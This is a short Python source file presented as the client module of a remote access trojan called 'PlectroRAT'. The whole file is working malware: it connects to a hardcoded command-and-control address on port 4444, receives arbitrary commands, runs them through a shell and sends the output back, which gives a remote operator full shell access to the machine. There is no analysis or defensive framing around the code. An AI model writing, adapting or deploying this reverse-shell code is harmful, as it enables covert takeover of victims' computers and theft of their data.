

# Client module for PlectroRAT
# Connects to a remote C2 server, receives commands, and executes them

import socket
import subprocess
import os

SERVER_IP = "192.168.1.10"
SERVER_PORT = 4444

def connect_to_server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((SERVER_IP, SERVER_PORT))

    while True:
        command = s.recv(1024).decode("utf-8")
        if command.lower() == "exit":
            break
        elif command.startswith("cd "):
            try:
                os.chdir(command[3:].strip())
                s.send(f"[+] Changed directory to {os.getcwd()}".encode("utf-8"))
            except Exception as e:
                s.send(f"[!] Error changing directory: {str(e)}".encode("utf-8"))
        else:
            try:
                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                s.send(output)
            except subprocess.CalledProcessError as e:
                s.send(e.output)

    s.close()

if __name__ == "__main__":
    connect_to_server()